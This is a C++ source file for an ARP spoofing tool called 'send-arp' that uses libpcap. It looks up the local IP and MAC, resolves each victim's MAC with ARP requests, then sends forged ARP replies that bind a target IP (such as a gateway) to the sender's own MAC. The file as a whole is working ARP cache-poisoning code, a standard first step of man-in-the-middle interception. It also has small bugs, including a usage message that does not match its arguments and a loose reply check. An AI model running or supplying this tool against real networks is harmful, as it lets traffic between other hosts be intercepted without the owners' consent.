#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h> 
#include <net/if.h>
#include <stdio.h>
#include <pcap/pcap.h>
#include <libnet.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <string.h>

#define REQUEST 1
#define REPLY 2
#define MAC_SIZE 6
#define IP_SIZE 4

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
EthArpPacket packet;
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface>\n");
	printf("sample: send-arp wlan0\n");
}

int sendArp(pcap_t* handle, char* sender_ip, char* target_ip,unsigned char* my_mac,unsigned char* your_mac,uint16_t op) {

	if (op==REQUEST) {
		printf("\n====[*] Send REQUEST====\n");
		packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
		packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
		packet.arp_.op_ = htons(ArpHdr::Request);
	} else if (op == REPLY) {
		printf("\n====[*] Send REPLY====\n");
		packet.eth_.dmac_ = Mac(your_mac); // YOUR_MAC
		packet.arp_.tmac_ = Mac(your_mac); // YOUR_MAC
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}
	packet.eth_.smac_=Mac(my_mac);
	packet.eth_.type_=htons(EthHdr::Arp);

	packet.arp_.hrd_= htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	packet.arp_.smac_= Mac(my_mac); // MY_MAC
	packet.arp_.sip_ =htonl(Ip(sender_ip));
	packet.arp_.tip_=htonl(Ip(target_ip));

	if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
		fprintf(stderr, "couldn't send packet : %s\n", pcap_geterr(handle));
		return -1;
	}
	printf("[*] Successfully send arp from '%s' to '%s'\n",sender_ip,target_ip);
	printf("[*] From Mac Address: %02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);
	printf("[*] To Mac Address: %02x:%02x:%02x:%02x:%02x:%02x\n", your_mac[0],your_mac[1],your_mac[2],your_mac[3],your_mac[4],your_mac[5]);
	return 0;
}
// MY_IP
int32_t getMyIp(char* dev, char* my_ip){
    struct ifreq ifr;
    u_int32_t s;
	char buf[20];
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        printf("Error");
		return -1;
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2,
                buf,sizeof(struct sockaddr));
        printf("[*] myOwn IP Address is %s\n", buf);
		memcpy(my_ip,buf,strlen(buf));
    }
    return 0;
}
// MY_MAC
void getMyMac(char *dev,unsigned char* my_mac) {
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy(ifr.ifr_name , dev , IFNAMSIZ - 1);

	ioctl(fd, SIOCGIFHWADDR, &ifr);
	memcpy(my_mac,ifr.ifr_hwaddr.sa_data,6);
	printf("[*] myOwn Mac Addr: %02x:%02x:%02x:%02x:%02x:%02x\n", my_mac[0],my_mac[1],my_mac[2],my_mac[3],my_mac[4],my_mac[5]);	
}

int getYourMac(pcap_t* handle, char* my_ip, char* your_ip, unsigned char* my_mac,unsigned char* your_mac){
    while(true){
        sendArp(handle, my_ip, your_ip, my_mac,your_mac,REQUEST);
		struct pcap_pkthdr* header;
		const u_char* _packet;
		int res = pcap_next_ex(handle, &header, &_packet);

		if (res == 0) continue;
		if (res == -1 || res == -2) {
			printf ("getYourMac Error!\n");
			break;
		}

		EthHdr* eth_ = (EthHdr*) _packet;
		if (eth_->type_ != htons(0x0806)){
			printf("[-] ! NOT ARP !\n");
			continue;
		}
		ArpHdr* arp_ = (ArpHdr*) ((uint8_t*)(_packet) + 14);
		if (packet.arp_.tip_ == arp_->sip_ && packet.arp_.sip_ == arp_->tip_ && arp_->op_ != htons(0x0002)){
			printf("[-] ! NOT REPLY!\n");
		}
		memcpy(your_mac,(u_char*)arp_->smac_,6);
		printf("[+] Your(victim) mac addr: %02x:%02x:%02x:%02x:%02x:%02x\n", your_mac[0],your_mac[1],your_mac[2],your_mac[3],your_mac[4],your_mac[5]);
		break;
    }
	return 0;
}   

int main(int argc, char* argv[]) {
	if (argc % 2 != 0 || argc < 4) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char my_ip[20]={0,};
	unsigned char my_mac[6]={0,};
	getMyIp(dev,my_ip);
	getMyMac(dev,my_mac);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	for(int i=1;i<argc/2;i++){
		printf("\n----[*] Round %d----\n",i);
		//u_int8_t s_mac[6]={0,};
		//packet.arp_.sip_ = htonl(Ip(argv[2*i]));
		//packet.arp_.tip_ = htonl(Ip(argv[2*i+1]));
		unsigned char your_mac[6] = { 0 };
		getYourMac(handle,my_ip,argv[2*i],my_mac,your_mac);
		sendArp(handle,argv[2*i+1], argv[2*i],my_mac,your_mac,REPLY);
	}
	pcap_close(handle);

}
